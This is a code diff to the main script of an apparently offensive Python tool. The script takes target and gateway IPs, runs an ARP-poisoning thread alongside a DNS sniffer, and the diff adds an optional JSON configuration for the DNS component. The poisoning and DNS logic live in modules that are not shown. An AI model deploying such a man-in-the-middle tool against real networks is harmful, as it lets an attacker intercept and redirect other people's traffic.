@@ -6,6 +6,7 @@ import threading, time
 import sys
 import ARPPoisoner
 import DNSSniff
+import DNSConf
 import multiprocessing
 
 class SWRT(object):
@@ -16,6 +17,7 @@ class SWRT(object):
     parser.add_argument('-i', action='store', dest='interface', help='Store the interface', required=True)
     parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
     parser.add_argument('-r', action='store', dest='gateway', help='Store the gateway IP address', required=True)
+    parser.add_argument('-c', action='store', dest='conf', help='Store path/to/conf.json', required=False)
     SWRT.args = parser.parse_args()
  
   def printArgs(self):
@@ -31,7 +33,13 @@ class SWRT(object):
 def main():
   SWRT().parseArgs()
   SWRT().printArgs()
-  sniffer = DNSSniff.DNSSniffer(SWRT.args.interface)
+  if (SWRT.args.conf != None):
+    print(SWRT.args)
+    conf = DNSConf.DNSConf(SWRT.args.interface, SWRT.args.conf)
+  else:
+    conf = DNSConf.DNSConf(SWRT.args.interface)
+  conf.printConfig()
+  sniffer = DNSSniff.DNSSniffer(SWRT.args.interface, conf)
   poisoner = ARPPoisoner.ARPPoisoner(SWRT.args.target, SWRT.args.gateway, SWRT.args.interface)
   poisoner.daemon = True
   sniffer.daemon = True
@@ -39,12 +47,9 @@ def main():
   poisoner.start()
   try:
     sniffer.join()
-    poisoner.join()
   except KeyboardInterrupt:
     poisoner.stop()
     sniffer.stop()
-    sniffer.terminate()
-    poisoner.terminate()
 
 if __name__ == '__main__':
   if os.getuid()!=0:
